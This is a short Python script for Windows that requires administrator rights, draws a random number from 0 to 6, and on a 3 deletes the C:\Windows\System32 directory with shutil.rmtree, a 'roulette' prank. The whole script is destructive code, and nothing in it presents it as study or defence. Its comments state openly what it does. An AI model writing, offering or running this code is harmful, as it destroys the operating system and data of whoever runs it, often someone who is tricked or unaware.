import random
import shutil
import ctypes
import sys

# Check if running as administrator
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    print("This program requires administrator privileges to run.")
    print("Please run this program as an administrator.")
    input("Press Enter to exit...")
    sys.exit(1)

# Your main program logic here
# ...

print("Running with administrator privileges.")
# Continue with the rest of your program...


#random number between 0 and 6
random_number = random.randint(0, 6)

#shows the output of "random_number"
print(random_number)

#if the output is 3 the code will delete the system 32 directory and exits the program on the next key press
if random_number == 3:
    shutil.rmtree(r'C:\Windows\System32', ignore_errors=True)
    
input("Press Enter to exit...")
    
